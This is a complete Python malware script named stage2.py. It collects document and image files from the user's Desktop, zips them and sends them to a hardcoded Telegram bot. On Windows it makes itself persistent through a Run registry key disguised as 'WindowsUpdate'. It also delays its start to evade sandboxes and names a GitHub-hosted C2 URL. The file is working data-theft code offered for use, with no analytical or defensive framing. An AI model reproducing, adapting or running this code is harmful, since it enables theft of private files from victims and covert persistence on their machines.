# stage2.py
import os
import shutil
import getpass
import requests
import subprocess
import time
import sys

# --- CONFIG (DO NOT CHANGE IN FILE — YOU CONTROL VIA GITHUB) ---
TELEGRAM_TOKEN = "8268540452:AAEQl6dAmNxWTrfVEOy4liqMoxt2qm1-_hs"
CHAT_ID = "3032183658"
C2_URL = "https://raw.githubusercontent.com/Jeki1234121/dev-tools-backup/main/stage2.py"

# --- EXFIL: Steal Desktop Files ---
def exfil_files():
    user = getpass.getuser()
    if os.name == 'nt':
        desktop = f"C:\\Users\\{user}\\Desktop"
    else:
        desktop = f"/home/{user}/Desktop"

    # Find sensitive files
    files = []
    for f in os.listdir(desktop):
        if f.lower().endswith(('.pdf', '.docx', '.xlsx', '.txt', '.jpg')) and os.path.getsize(f"{desktop}/{f}") < 5_000_000:
            files.append(f"{desktop}/{f}")

    if not files:
        return

    # Zip them
    shutil.make_archive("exfil", 'zip', desktop, None, files)

    # Send to Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    try:
        with open("exfil.zip", "rb") as f:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
        os.remove("exfil.zip")
    except:
        pass

# --- PERSISTENCE: Add to Run Key (Windows) ---
def add_persistence():
    if os.name != 'nt':
        return
    try:
        reg_cmd = (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v "WindowsUpdate" '
            f'/t REG_SZ /d "python \\"{sys.argv[0]}\\"" /f'
        )
        subprocess.Popen(reg_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    # Sleep 30–90 sec (avoid sandbox)
    time.sleep(30 + (hash(str(os.environ)) % 60))

    # Run tasks
    try:
        exfil_files()
        add_persistence()
    except:
        pass
